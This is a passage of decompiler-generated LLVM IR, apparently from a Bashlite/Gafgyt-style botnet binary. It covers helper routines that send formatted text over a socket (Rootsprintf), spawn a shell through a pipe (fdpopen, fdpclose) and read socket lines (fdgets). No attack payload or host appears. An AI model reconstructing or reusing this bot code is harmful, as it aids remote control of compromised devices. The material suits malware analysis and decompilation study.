  %v3_8048794 = inttoptr i32 %v2_8048794 to i32*
  store i32 %v2_8048791, i32* %v3_8048794, align 4
  %v5_8048795 = add i32 %v0_80487af, -16
  %v6_8048795 = inttoptr i32 %v5_8048795 to i32*
  store i32 %tmp3, i32* %v6_8048795, align 4
  %v0_8048798 = load i32, i32* %stack_var_-6, align 4
  %v6_8048798 = call i32 @prints(i32 %v0_8048798, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8048798, i32* %eax.global-to-local, align 4
  %v0_804879d = load i32, i32* @esp, align 4
  %v1_804879d = add i32 %v0_804879d, 16
  %v5_80487a0 = add i32 %v6_8048798, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80487a5:                             ; preds = %dec_label_pc_80485d8, %dec_label_pc_80485ae
  %stack_var_8.2 = phi i8* [ %stack_var_8.455, %dec_label_pc_80485ae ], [ %v22_80485bb, %dec_label_pc_80485d8 ]
  %v4_80487a5 = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_80487a5, i32* %eax.global-to-local, align 4
  %v2_80487a8 = load i8, i8* %stack_var_8.2, align 1
  %v3_80487a8 = zext i8 %v2_80487a8 to i32
  store i32 %v3_80487a8, i32* %eax.global-to-local, align 4
  %v2_80487b2 = add i32 %v0_80487af, -12
  %v3_80487b2 = inttoptr i32 %v2_80487b2 to i32*
  store i32 %v3_80487a8, i32* %v3_80487b2, align 4
  %v5_80487b3 = add i32 %v0_80487af, -16
  %v6_80487b3 = inttoptr i32 %v5_80487b3 to i32*
  store i32 %tmp3, i32* %v6_80487b3, align 4
  %v2_80487b6 = inttoptr i32 %stack_var_-28.154 to i32*
  %v3_80487b6 = call i32 @printchar(i32* %v2_80487b6, i32 %stack_var_-24.151)
  store i32 %v3_80487b6, i32* %eax.global-to-local, align 4
  %v0_80487bb = load i32, i32* @esp, align 4
  %v1_80487bb = add i32 %v0_80487bb, 16
  %v4_80487be = add i32 %stack_var_-28.154, 1
  br label %dec_label_pc_80487c1

dec_label_pc_80487c1:                             ; preds = %dec_label_pc_804876e, %dec_label_pc_8048777, %dec_label_pc_8048741, %dec_label_pc_8048708, %dec_label_pc_8048670, %dec_label_pc_80486cf, %dec_label_pc_8048696, %dec_label_pc_80487a5
  %v4_804867366 = phi i32 [ %v1_80487bb, %dec_label_pc_80487a5 ], [ %v0_80487af, %dec_label_pc_804876e ], [ %v1_804879d, %dec_label_pc_8048777 ], [ %v1_8048766, %dec_label_pc_8048741 ], [ %v1_804872d, %dec_label_pc_8048708 ], [ %v1_80486f4, %dec_label_pc_80486cf ], [ %v1_80486bb, %dec_label_pc_8048696 ], [ %v1_8048682, %dec_label_pc_8048670 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.151, %dec_label_pc_80487a5 ], [ %stack_var_-24.151, %dec_label_pc_804876e ], [ %stack_var_-24.151, %dec_label_pc_8048777 ], [ %stack_var_-24.151, %dec_label_pc_8048741 ], [ %stack_var_-24.151, %dec_label_pc_8048708 ], [ %stack_var_-24.151, %dec_label_pc_80486cf ], [ %stack_var_-24.151, %dec_label_pc_8048696 ], [ %v2_8048656, %dec_label_pc_8048670 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.152, %dec_label_pc_80487a5 ], [ %stack_var_12.152, %dec_label_pc_804876e ], [ %v1_804877a, %dec_label_pc_8048777 ], [ %v1_8048744, %dec_label_pc_8048741 ], [ %v1_804870b, %dec_label_pc_8048708 ], [ %v1_80486d2, %dec_label_pc_80486cf ], [ %v1_8048699, %dec_label_pc_8048696 ], [ %v1_804864e, %dec_label_pc_8048670 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_80487a5 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804876e ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048777 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048741 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048708 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486cf ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048696 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048670 ]
  %stack_var_-28.0 = phi i32 [ %v4_80487be, %dec_label_pc_80487a5 ], [ %stack_var_-28.154, %dec_label_pc_804876e ], [ %v5_80487a0, %dec_label_pc_8048777 ], [ %v5_8048769, %dec_label_pc_8048741 ], [ %v5_8048730, %dec_label_pc_8048708 ], [ %v5_80486f7, %dec_label_pc_80486cf ], [ %v5_80486be, %dec_label_pc_8048696 ], [ %v5_8048685, %dec_label_pc_8048670 ]
  %v4_80487c1 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_80487c1 = add i32 %v4_80487c1, 1
  %stack_var_8.4 = inttoptr i32 %v5_80487c1 to i8*
  store i32 %v5_80487c1, i32* %eax.global-to-local, align 4
  %v2_80487c7 = load i8, i8* %stack_var_8.4, align 1
  %v3_80487c7 = zext i8 %v2_80487c7 to i32
  %v5_80487c7 = and i32 %v5_80487c1, -256
  %v6_80487c7 = or i32 %v3_80487c7, %v5_80487c7
  store i32 %v6_80487c7, i32* %eax.global-to-local, align 4
  %v4_80487c9 = icmp eq i8 %v2_80487c7, 0
  %v1_80487cb = icmp eq i1 %v4_80487c9, false
  br i1 %v1_80487cb, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80487d1:                             ; preds = %dec_label_pc_80487c1, %dec_label_pc_80485bb, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.154, %dec_label_pc_80485bb ], [ %stack_var_-28.0, %dec_label_pc_80487c1 ]
  %v4_80487d1 = icmp eq i32* %arg1, null
  br i1 %v4_80487d1, label %dec_label_pc_80487df, label %dec_label_pc_80487d7

dec_label_pc_80487d7:                             ; preds = %dec_label_pc_80487d1
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_80487da = load i32, i32* %arg1, align 4
  store i32 %v2_80487da, i32* %eax.global-to-local, align 4
  %v1_80487dc = inttoptr i32 %v2_80487da to i8*
  store i8 0, i8* %v1_80487dc, align 1
  br label %dec_label_pc_80487df

dec_label_pc_80487df:                             ; preds = %dec_label_pc_80487d1, %dec_label_pc_80487d7
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487e2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80487e2, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_80487c7, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_80487c1, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_8048656, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_8048633.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_8048630.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_80485fa, { 1, 2, 3, 0 }
  uselistorder i8* %v22_80485bb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.151, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.152, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in53, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.154, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_80487af, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 55, 56, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 57, 58, 59, 60, 61, 62, 63, 64, 65, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 40, 1, 3, 45, 46, 4, 5, 47, 48, 49, 50, 51, 52, 53, 54, 0, 2 }
  uselistorder i32 (i32)* @printi, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80487df, { 1, 0 }
  uselistorder label %dec_label_pc_80487c1, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_8048670, { 1, 0 }
  uselistorder label %dec_label_pc_8048642, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048639, { 1, 0 }
  uselistorder label %dec_label_pc_80485fa, { 1, 0 }
  uselistorder label %dec_label_pc_80485ae, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %v4_80487ed = ptrtoint i32* %stack_var_8 to i32
  %v4_80487fc = call i32 @print(i32* null, i32 %arg1, i32 %v4_80487ed)
  ret i32 %v4_80487fc
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_804880f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048820 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_804880f)
  ret i32 %v4_8048820
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v0_804882d = load i32, i32* @edi, align 4
  %v1_8048839 = call i32 @malloc(i32 2048)
  store i32 %v1_8048839, i32* %stack_var_-20, align 4
  %v3_8048855 = inttoptr i32 %v1_8048839 to i8*
  %v4_8048855 = call i32 @__GI_memset(i8* %v3_8048855, i32 0, i32 2048)
  %v4_8048866 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048878 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_8048866)
  %v3_8048891 = call i32 @_strlen(i8* %v3_8048855)
  %v6_8048898 = add i32 %v1_8048839, %v3_8048891
  %v1_804889b = inttoptr i32 %v6_8048898 to i8*
  store i8 10, i8* %v1_804889b, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_8048839, i32* @edi, align 4
  %v3_80488af = call i32 @_strlen(i8* %v3_8048855)
  %v4_80488c2 = call i32 @__libc_send(i32 %arg1, i32 %v1_8048839, i32 %v3_80488af, i32 16384)
  %v1_80488d3 = call i32 @free(i32 %v1_8048839)
  store i32 %v0_804882d, i32* @edi, align 4
  ret i32 %v4_80488c2

; uselistorder directives
  uselistorder i32 %v1_8048839, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen() local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e6 = load i32, i32* @edi, align 4
  store i32 %v0_80488e6, i32* %stack_var_-8, align 4
  %v4_80488ea = ptrtoint i8* %tmp24 to i32
  %v2_80488ed = load i8, i8* %tmp24, align 1
  %v10_80488ef = icmp eq i8 %v2_80488ed, 114
  br i1 %v10_80488ef, label %dec_label_pc_80488fc, label %dec_label_pc_80488f3

dec_label_pc_80488f3:                             ; preds = %entry
  %v2_80488f6 = load i8, i8* %tmp24, align 1
  %v10_80488f8 = icmp eq i8 %v2_80488f6, 119
  %v1_80488fa = icmp eq i1 %v10_80488f8, false
  br i1 %v1_80488fa, label %dec_label_pc_8048ad1, label %dec_label_pc_80488fc

dec_label_pc_80488fc:                             ; preds = %dec_label_pc_80488f3, %entry
  %v1_80488ff = add i32 %v4_80488ea, 1
  %v1_8048900 = inttoptr i32 %v1_80488ff to i8*
  %v2_8048900 = load i8, i8* %v1_8048900, align 1
  %v4_8048902 = icmp eq i8 %v2_8048900, 0
  br i1 %v4_8048902, label %dec_label_pc_8048912, label %dec_label_pc_8048ad1

dec_label_pc_8048912:                             ; preds = %dec_label_pc_80488fc
  %v2_8048915 = ptrtoint i32* %stack_var_-24 to i32
  %v1_8048919 = call i32 @__GI_pipe(i32 %v2_8048915)
  %v2_8048921 = icmp slt i32 %v1_8048919, 0
  %v1_8048923 = icmp eq i1 %v2_8048921, false
  br i1 %v1_8048923, label %dec_label_pc_8048931, label %dec_label_pc_8048ad1

dec_label_pc_8048931:                             ; preds = %dec_label_pc_8048912
  %v0_8048931 = load i8*, i8** @global_var_805e180.13, align 4
  %v2_8048936 = icmp eq i8* %v0_8048931, null
  %v1_8048938 = icmp eq i1 %v2_8048936, false
  br i1 %v1_8048938, label %bb, label %dec_label_pc_804893a

dec_label_pc_804893a:                             ; preds = %dec_label_pc_8048931
  %v0_804893a = call i32 @getdtablesize()
  %tmp37 = icmp slt i32 %v0_804893a, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8048954, label %dec_label_pc_8048ad1

dec_label_pc_8048954:                             ; preds = %dec_label_pc_804893a
  %v2_8048957 = mul i32 %v0_804893a, 4
  %v1_804895e = call i32 @malloc(i32 %v2_8048957)
  %v1_8048966 = inttoptr i32 %v1_804895e to i8*
  store i8* %v1_8048966, i8** @global_var_805e180.13, align 128
  %v2_8048970 = icmp eq i32 %v1_804895e, 0
  %v1_8048972 = icmp eq i1 %v2_8048970, false
  br i1 %v1_8048972, label %dec_label_pc_8048980, label %dec_label_pc_8048ad1

dec_label_pc_8048980:                             ; preds = %dec_label_pc_8048954
  %v1_8048983 = mul i32 %v0_804893a, 4
  store i32 %v1_804895e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048994 = and i32 %v1_804895e, -256
  %v5_8048996 = call i8* @_memset(i8* %v1_8048966, i32 %v1_8048994, i32 %v1_8048983)
  br label %bb

bb:                                               ; preds = %dec_label_pc_8048931, %dec_label_pc_8048980
  %v0_8048998 = call i32 @__vfork()
  %v13_80489a6 = icmp eq i32 %v0_8048998, -1
  br i1 %v13_80489a6, label %dec_label_pc_80489b7, label %dec_label_pc_80489ac

dec_label_pc_80489ac:                             ; preds = %bb
  %v4_80489ac = icmp eq i32 %v0_8048998, 0
  %v2_80489e4 = load i8, i8* %tmp24, align 1
  %v10_80489e6 = icmp eq i8 %v2_80489e4, 114
  %v1_80489e8 = icmp eq i1 %v10_80489e6, false
  br i1 %v4_80489ac, label %dec_label_pc_80489e1, label %dec_label_pc_8048a82

dec_label_pc_80489b7:                             ; preds = %bb
  %v3_80489b7 = load i32, i32* %stack_var_-24, align 4
  %v1_80489be = call i32 @__libc_close(i32 %v3_80489b7)
  %v1_80489cd = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ad1

dec_label_pc_80489e1:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048a23, label %dec_label_pc_80489ea

dec_label_pc_80489ea:                             ; preds = %dec_label_pc_80489e1
  %v9_80489ed = icmp eq i32 %tmp19, 1
  br i1 %v9_80489ed, label %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, label %dec_label_pc_80489f2

dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge: ; preds = %dec_label_pc_80489ea
  br label %dec_label_pc_8048a12

dec_label_pc_80489f2:                             ; preds = %dec_label_pc_80489ea
  %v2_80489fb = call i32 @dup2(i32 %tmp19, i32 1)
  %v1_8048a0a = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a12

dec_label_pc_8048a12:                             ; preds = %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, %dec_label_pc_80489f2
  %v3_8048a12 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a19 = call i32 @__libc_close(i32 %v3_8048a12)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a23:                             ; preds = %dec_label_pc_80489e1
  %v3_8048a23 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a26 = icmp eq i32 %v3_8048a23, 0
  br i1 %v1_8048a26, label %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, label %dec_label_pc_8048a2a

dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge: ; preds = %dec_label_pc_8048a23
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a2a:                             ; preds = %dec_label_pc_8048a23
  %v2_8048a33 = call i32 @dup2(i32 %v3_8048a23, i32 0)
  %v3_8048a3b = load i32, i32* %stack_var_-24, align 4
  %v1_8048a42 = call i32 @__libc_close(i32 %v3_8048a3b)
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a4a:                             ; preds = %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, %dec_label_pc_8048a2a
  %v1_8048a51 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a59:                             ; preds = %dec_label_pc_8048a12, %dec_label_pc_8048a4a
  %v8_8048a70 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_8055d4a.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_8055d47.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8055d44.14 to i32), i32 %tmp18, i32 0)
  %v1_8048a7d = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048a82:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048aa2, label %dec_label_pc_8048a8b

dec_label_pc_8048a8b:                             ; preds = %dec_label_pc_8048a82
  %v3_8048a8b = load i32, i32* %stack_var_-24, align 4
  %v2_8048a98 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048aa2:                             ; preds = %dec_label_pc_8048a82
  %v3_8048aa8 = load i32, i32* %stack_var_-24, align 4
  %v2_8048aaf = call i32 @__libc_close(i32 %v3_8048aa8)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048ab7:                             ; preds = %dec_label_pc_8048a8b, %dec_label_pc_8048aa2
  %stack_var_-28.0 = phi i32 [ %v3_8048a8b, %dec_label_pc_8048a8b ], [ %tmp19, %dec_label_pc_8048aa2 ]
  %v2_8048aba = mul i32 %stack_var_-28.0, 4
  %v0_8048abf = load i8*, i8** @global_var_805e180.13, align 4
  %v1_8048abf = ptrtoint i8* %v0_8048abf to i32
  %v2_8048ac4 = add i32 %v1_8048abf, %v2_8048aba
  %v2_8048ac9 = inttoptr i32 %v2_8048ac4 to i32*
  store i32 %v0_8048998, i32* %v2_8048ac9, align 4
  br label %dec_label_pc_8048ad1

dec_label_pc_8048ad1:                             ; preds = %dec_label_pc_8048954, %dec_label_pc_804893a, %dec_label_pc_8048912, %dec_label_pc_80488f3, %dec_label_pc_80488fc, %dec_label_pc_80489b7, %dec_label_pc_8048ab7
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_80489b7 ], [ %stack_var_-28.0, %dec_label_pc_8048ab7 ], [ -1, %dec_label_pc_80488fc ], [ -1, %dec_label_pc_80488f3 ], [ -1, %dec_label_pc_8048912 ], [ -1, %dec_label_pc_804893a ], [ -1, %dec_label_pc_8048954 ]
  %v3_8048ad4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048ad4, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_8048998, { 1, 2, 0 }
  uselistorder i32 %v1_804895e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804893a, { 2, 0, 1 }
  uselistorder i8* %tmp24, { 0, 1, 3, 2 }
  uselistorder i32 %tmp19, { 1, 6, 3, 4, 5, 0, 2 }
  uselistorder label %dec_label_pc_8048ad1, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048ab7, { 1, 0 }
  uselistorder label %dec_label_pc_8048a59, { 1, 0 }
  uselistorder label %dec_label_pc_8048a4a, { 1, 0 }
  uselistorder label %dec_label_pc_8048a12, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048ad9 = load i32, i32* @ebp, align 4
  store i32 %v0_8048ad9, i32* %stack_var_-4, align 4
  %v0_8048ae2 = load i8*, i8** @global_var_805e180.13, align 4
  %v2_8048ae7 = icmp eq i8* %v0_8048ae2, null
  br i1 %v2_8048ae7, label %dec_label_pc_8048c35, label %dec_label_pc_8048aeb

dec_label_pc_8048aeb:                             ; preds = %entry
  %v1_8048ae2 = ptrtoint i8* %v0_8048ae2 to i32
  %v2_8048aee = mul i32 %tmp11, 4
  %v2_8048af8 = add i32 %v1_8048ae2, %v2_8048aee
  %v1_8048afb = inttoptr i32 %v2_8048af8 to i32*
  %v2_8048afb = load i32, i32* %v1_8048afb, align 4
  %v1_8048afd = icmp eq i32 %v2_8048afb, 0
  %v1_8048aff = icmp eq i1 %v1_8048afd, false
  br i1 %v1_8048aff, label %dec_label_pc_8048b10, label %dec_label_pc_8048c35

dec_label_pc_8048b10:                             ; preds = %dec_label_pc_8048aeb
  %v1_8048b16 = call i32 @__libc_close(i32 %tmp11)
  %v2_8048b21 = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048b28 = call i32 @sigemptyset(i32 %v2_8048b21)
  %v2_8048b3c = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 2)
  %v2_8048b50 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 3)
  %v2_8048b64 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 1)
  %v2_8048b6f = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048b7f = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048b7f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048b7f, i32 %v2_8048b6f)
  %v2_8048b9e = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048b87

dec_label_pc_8048b87:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b10
  %v0_8048b8f = load i8*, i8** @global_var_805e180.13, align 4
  %v1_8048b8f = ptrtoint i8* %v0_8048b8f to i32
  %v2_8048b94 = add i32 %v1_8048b8f, %v2_8048aee
  %v1_8048b97 = inttoptr i32 %v2_8048b94 to i32*
  %v2_8048b97 = load i32, i32* %v1_8048b97, align 4
  %v3_8048ba6 = call i32 @__libc_waitpid(i32 %v2_8048b97, i32 %v2_8048b9e, i32 0)
  %v13_8048bb4 = icmp eq i32 %v3_8048ba6, -1
  %v1_8048bbb = icmp eq i1 %v13_8048bb4, false
  br i1 %v1_8048bbb, label %dec_label_pc_8048bc9, label %dec_label_pc_8048bbd

dec_label_pc_8048bbd:                             ; preds = %dec_label_pc_8048b87
  %v1_8048bbd = call i32 @__errno_location(i32 %v3_8048ba6)
  %v1_8048bc2 = inttoptr i32 %v1_8048bbd to i32*
  %v2_8048bc2 = load i32, i32* %v1_8048bc2, align 4
  %v9_8048bc4 = icmp eq i32 %v2_8048bc2, 4
  br i1 %v9_8048bc4, label %dec_label_pc_8048b87, label %dec_label_pc_8048bc9

dec_label_pc_8048bc9:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b87
  %v13_8048bb4.lcssa = phi i1 [ true, %dec_label_pc_8048bbd ], [ false, %dec_label_pc_8048b87 ]
  %v3_8048bd7 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048bd7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048bd7, i32 0)
  %v2_8048be5 = mul i32 %tmp8, 4
  %v0_8048bea = load i8*, i8** @global_var_805e180.13, align 4
  %v1_8048bea = ptrtoint i8* %v0_8048bea to i32
  %v2_8048bef = add i32 %v1_8048bea, %v2_8048be5
  %v1_8048bf2 = inttoptr i32 %v2_8048bef to i32*
  store i32 0, i32* %v1_8048bf2, align 4
  br i1 %v13_8048bb4.lcssa, label %dec_label_pc_8048c29, label %dec_label_pc_8048c01

dec_label_pc_8048c01:                             ; preds = %dec_label_pc_8048bc9
  %v3_8048c01 = load i32, i32* %stack_var_-268, align 4
  %v1_8048c0d = and i32 %v3_8048c01, 65280
  %v2_8048c141 = udiv i32 %v1_8048c0d, 256
  br label %dec_label_pc_8048c29

dec_label_pc_8048c29:                             ; preds = %dec_label_pc_8048bc9, %dec_label_pc_8048c01
  %storemerge2 = phi i32 [ %v2_8048c141, %dec_label_pc_8048c01 ], [ -1, %dec_label_pc_8048bc9 ]
  %v2_8048c3b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048c35

dec_label_pc_8048c35:                             ; preds = %entry, %dec_label_pc_8048aeb, %dec_label_pc_8048c29
  %v2_8048c3b = phi i32 [ %v2_8048c3b.pre, %dec_label_pc_8048c29 ], [ %v0_8048ad9, %dec_label_pc_8048aeb ], [ %v0_8048ad9, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048c29 ], [ -1, %dec_label_pc_8048aeb ], [ -1, %entry ]
  store i32 %v2_8048c3b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048ba6, { 1, 0 }
  uselistorder i32 %v2_8048aee, { 1, 0 }
  uselistorder i8* %v0_8048ae2, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_805e180.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c29, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048c76

dec_label_pc_8048c53:                             ; preds = %dec_label_pc_8048c7e
  %v3_8048c62 = inttoptr i32 %v5_8048c81 to i32*
  %v4_8048c62 = call i32 @__libc_read(i32 %arg3, i32* %v3_8048c62, i32 1)
  %v4_8048c6d = add nuw i32 %storemerge115, 1
  %v8_8048c70 = icmp eq i32 %v4_8048c62, 0
  %v12_8048c70 = icmp eq i32 %v4_8048c62, 1
  %v1_8048c74 = icmp eq i1 %v12_8048c70, false
  br i1 %v1_8048c74, label %dec_label_pc_8048c8b, label %dec_label_pc_8048c76

dec_label_pc_8048c76:                             ; preds = %entry, %dec_label_pc_8048c53
  %v8_8048c7016 = phi i1 [ false, %entry ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  %storemerge115 = phi i32 [ 0, %entry ], [ %v4_8048c6d, %dec_label_pc_8048c53 ]
  %v5_8048c7c = icmp slt i32 %storemerge115, %arg2
  br i1 %v5_8048c7c, label %dec_label_pc_8048c7e, label %dec_label_pc_8048c8b

dec_label_pc_8048c7e:                             ; preds = %dec_label_pc_8048c76
  %v5_8048c81 = add i32 %storemerge115, %arg1
  %v1_8048c84 = add i32 %v5_8048c81, -1
  %v1_8048c85 = inttoptr i32 %v1_8048c84 to i8*
  %v2_8048c85 = load i8, i8* %v1_8048c85, align 1
  %v10_8048c87 = icmp eq i8 %v2_8048c85, 10
  %v1_8048c89 = icmp eq i1 %v10_8048c87, false
  br i1 %v1_8048c89, label %dec_label_pc_8048c53, label %dec_label_pc_8048c8b

dec_label_pc_8048c8b:                             ; preds = %dec_label_pc_8048c76, %dec_label_pc_8048c7e, %dec_label_pc_8048c53
  %v8_8048c70.lcssa = phi i1 [ %v8_8048c7016, %dec_label_pc_8048c76 ], [ %v8_8048c7016, %dec_label_pc_8048c7e ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  br i1 %v8_8048c70.lcssa, label %dec_label_pc_8048ca0, label %dec_label_pc_8048c91

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_8048c8b
  br label %dec_label_pc_8048ca0

dec_label_pc_8048ca0:                             ; preds = %dec_label_pc_8048c8b, %dec_label_pc_8048c91
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048c91 ], [ 0, %dec_label_pc_8048c8b ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048c81, { 1, 0 }
  uselistorder i32 %storemerge115, { 2, 0, 1 }
  uselistorder i1 %v8_8048c7016, { 1, 0 }
  uselistorder i1 %v8_8048c70, { 1, 0 }
  uselistorder i32 %v4_8048c62, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048ca0, { 1, 0 }
  uselistorder label %dec_label_pc_8048c8b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048c76, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
